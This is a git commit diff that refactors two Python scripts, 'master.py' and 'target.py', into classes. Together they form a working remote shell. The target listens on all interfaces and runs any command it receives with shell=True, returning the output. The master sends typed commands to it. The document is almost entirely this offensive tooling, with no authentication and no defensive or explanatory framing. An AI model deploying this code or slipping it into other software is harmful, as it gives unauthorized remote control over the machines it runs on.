74eec8462349935de1202cd854c9067834e82531
im-strange <itsmestrange.dump@gmail.com>
2024-01-28 22:24:20 +0800

    update

--- master.py
+++ master.py
@@ -1,23 +1,45 @@
 
 import socket
 
-client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-client_ip = "127.0.0.1"
-client_port = 12345
-client_addr = (client_ip, client_port)
-client_socket.connect(client_addr)
 
-socket_killed = False
+class Remote:
+    def __init__(self):
+        self.client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        self.client_ip = None
+        self.client_port = None
+        self.client_addr = None
 
-while not socket_killed:
-    command = input(f"{client_ip}/~: ")
+    def connect(self, host, port):
+        self.client_ip = host
+        self.client_port = port
+        self.client_addr = (host, port)
 
-    if "kill server" in command:
-        client_socket.close()
-        break
+        try:
+            print(f"[+] connecting to {host} in port {port}")
+            self.client_socket.connect(self.client_addr)
+            print(f"[+] Connected")
 
-    client_socket.sendall(command.encode())
+        except ConnectionRefusedError:
+             print(f"[+] Connection refused")
+             exit()
 
-    output = client_socket.recv(1024).decode()
-    print(output)
+        socket_killed = False
+
+        while not socket_killed:
+            command = input(f"[{self.client_ip}]/~: ")
+
+            if "kill server" in command:
+                self.client_socket.close()
+                break
+
+            self.client_socket.sendall(command.encode())
+
+            output = self.client_socket.recv(1024).decode()
+            print(output)
+
+if __name__ == "__main__":
+    remote = Remote()
+    host = "127.0.0.1"
+    port = 1234
+    remote.connect(host, port)
 
--- target.py
+++ target.py
@@ -2,36 +2,47 @@
 import socket
 import subprocess as sp
 
-server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+class Target:
+    def __init__(self):
+        self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        self.server_host = None
+        self.server_port = None
+        self.server_addr = None
 
-server_host = "0.0.0.0"
-server_port = 12345
-server_addr = (server_host, server_port)
-server_socket.bind(server_addr)
+    def listen(self, host, port):
+        self.server_host = host
+        self.server_port = port
+        self.server_addr = (host, port)
 
-server_socket.listen()
-print(f"[+] server listening on port {server_port}")
+        self.server_socket.bind(self.server_addr)
+        self.server_socket.listen()
+        print(f"[+] server listening on port {self.server_port}")
 
-while True:
-    print(f"[+] waiting for connection")
-    client_socket, client_addr = server_socket.accept()
+        while True:
+            print(f"[+] waiting for connection")
+            client_socket, client_addr = self.server_socket.accept()
+            print("[+] connection accepted from {}:{}".format(*client_addr))
 
-    print("[+] connection accepted from {}:{}".format(*client_addr))
+            while True:
+                command = client_socket.recv(1024).decode()
 
-    while True:
-        command = client_socket.recv(1024).decode()
+                if "kill server" in command:
+                    break
 
-        if "kill server" in command:
+                result = sp.run(command,
+                                shell=True,
+                                stdout=sp.PIPE,
+                                stderr=sp.PIPE,
+                                text=True
+                )
+
+                client_socket.sendall(result.stdout.encode())
+
+            client_socket.close()
             break
 
-        result = sp.run(command,
-                        shell=True,
-                        stdout=sp.PIPE,
-                        stderr=sp.PIPE,
-                        text=True
-        )
-
-        client_socket.sendall(result.stdout.encode())
-
-    client_socket.close()
-    break
+if __name__  == "__main__":
+    server = Target()
+    host = "0.0.0.0"
+    port = 1234
+    server.listen(host, port)
